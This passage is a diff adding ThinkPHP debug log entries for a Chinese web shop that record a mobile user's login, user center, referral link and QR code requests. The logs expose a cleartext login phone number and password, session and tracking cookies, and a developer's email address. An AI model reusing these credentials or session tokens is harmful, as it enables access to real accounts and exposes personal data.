+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:37:29+08:00 ] 172.31.179.54 49.118.138.184 GET /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,182.86kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:37:31+08:00 ] 172.31.179.54 49.118.138.184 GET /favicon.ico
+[ log ] dbgj.hoonking.com/favicon.ico [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：1,774.22kb] [文件加载：41]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'favicon_ico' => '',
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:37:47+08:00 ] 172.31.179.54 49.118.138.184 POST /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.093750s][吞吐率：10.67req/s] [内存消耗：2,200.31kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'origin' => 'http://dbgj.hoonking.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '31',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+  'key' => '15666666666',
+  'password' => '123456',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:37:47+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.125000s][吞吐率：8.00req/s] [内存消耗：2,294.48kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:38:20+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_friends.html
+[ log ] dbgj.hoonking.com/index/user/user_friends.html [运行时间：0.140625s][吞吐率：7.11req/s] [内存消耗：2,409.75kb] [文件加载：57]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_friends',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_friends_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method user_friends ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 430 - 473
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_friends.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zjh',
+  3 => 'hys',
+  4 => 'lists',
+  5 => 'page',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:38:46+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.125000s][吞吐率：8.00req/s] [内存消耗：2,294.65kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; a1724_pages=1; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201513080515957%7D; __51cke__=; __51laig__=1; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:38:50+08:00 ] 172.31.179.54 49.118.138.184 GET /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,183.79kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; a1724_pages=1; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201513080515957%7D; __51cke__=; __51laig__=1; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ VIEW ] ./themes/default/index/login.html [ array (
+  0 => 'userinfo',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:38:55+08:00 ] 172.31.179.54 49.118.138.184 POST /index/base/login.html
+[ log ] dbgj.hoonking.com/index/base/login.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,200.84kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'base',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'origin' => 'http://dbgj.hoonking.com',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; a1724_pages=1; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201513080515957%7D; __51cke__=; __51laig__=1; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '31',
+)
+[ info ] [ PARAM ] array (
+  'index/base/login_html' => '',
+  'key' => '15666666666',
+  'password' => '123456',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 用户登录方法
+     * @author  矢志bu渝 <745152620@qq.com>
+     */
+Method [ <user> public method login ] {
+  @@ E:\www\dbgj\application\index\controller\Base.php 57 - 83
+}
+
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:38:55+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.093750s][吞吐率：10.67req/s] [内存消耗：2,294.66kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; a1724_pages=1; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201513080515957%7D; __51cke__=; __51laig__=1; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:39:02+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; a1724_pages=1; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201513080515957%7D; __51cke__=; __51laig__=1; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:39:17+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/tuiguangqrcode.html
+[ log ] dbgj.hoonking.com/index/user/tuiguangqrcode.html [运行时间：0.500000s][吞吐率：2.00req/s] [内存消耗：7,562.56kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'tuiguangqrcode',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/user_link.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=2; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201513080543756%7D; __51cke__=; __51laig__=2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/tuiguangqrcode_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method tuiguangqrcode ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 362 - 383
+}
+
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:39:45+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=2; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201513080543756%7D; __51cke__=; __51laig__=2',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:39:54+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/tuiguangqrcode.html
+[ log ] dbgj.hoonking.com/index/user/tuiguangqrcode.html [运行时间：0.437500s][吞吐率：2.29req/s] [内存消耗：7,562.58kb] [文件加载：52]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'tuiguangqrcode',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/user_link.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=3; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201513080586425%7D; __51cke__=; __51laig__=3',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/tuiguangqrcode_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method tuiguangqrcode ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 362 - 383
+}
+
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:40:10+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
